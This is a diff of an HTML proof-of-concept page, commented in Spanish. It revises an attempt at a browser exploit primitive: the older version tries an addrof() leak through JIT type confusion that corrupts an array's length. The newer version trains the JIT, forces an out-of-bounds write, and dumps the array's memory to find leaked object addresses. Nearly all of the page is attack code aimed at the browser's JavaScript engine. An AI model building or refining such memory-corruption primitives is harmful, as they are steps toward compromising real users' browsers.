@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC: addrof() Primitiva</title>
+  <title>PoC Mejorado: Escaneo heap</title>
 </head>
 <body>
-  <h1>PoC: addrof() usando type confusion</h1>
+  <h1>PoC: Escaneo para encontrar addrof</h1>
   <pre id="log"></pre>
   <script>
     const log = (msg) => document.getElementById("log").textContent += msg + "\n";
@@ -13,42 +13,39 @@
     let obj_arr;
     let oob;
 
-    function hex(x) {
-      return '0x' + x.toString(16);
-    }
-
     function setup() {
-      float_arr = [1.1, 2.2, 3.3];
+      float_arr = new Array(100).fill(1.1);
       obj_arr = [{}, {a: 13.37}, {b: 42}];
-
+      // Entrenamos el JIT
       function confuse(arr, index, val) {
         for (let i = 0; i < 10000; i++) {
           arr[0] = 1.1;
-          arr[1] = 2.2;
         }
         arr[index] = val;
         return arr;
       }
 
-      oob = confuse(float_arr, 10, 13.37);  // Corrompe la longitud
+      // Esto debe provocar la expansión ilegal del array
+      oob = confuse(float_arr, 150, 13.37);
     }
 
-    function addrof(obj) {
-      obj_arr[0] = obj;
-      for (let i = 0; i < 20; i++) {
-        let val = oob[i];
-        if (val && typeof val === 'number' && val !== 1.1 && val !== 2.2 && val !== 3.3) {
-          return val;
+    function dumpArray() {
+      log("=== Dump extendido del array ===");
+      for (let i = 0; i < 200; i++) {
+        try {
+          let v = oob[i];
+          if (v !== 1.1 && typeof v === 'number') {
+            log(`oob[${i}] = ${v}`);
+          }
+        } catch (e) {
+          log(`oob[${i}] = [EXCEPTION]`);
         }
       }
-      throw "No se encontró la dirección";
     }
 
     setup();
-
-    let test_obj = {exploit: true};
-    let addr = addrof(test_obj);
-    log("[+] Dirección flotante de test_obj: " + addr + " (" + hex(new Float64Array([addr])[0]) + ")");
+    obj_arr[0] = {leak: true};
+    dumpArray();
   </script>
 </body>
 </html>
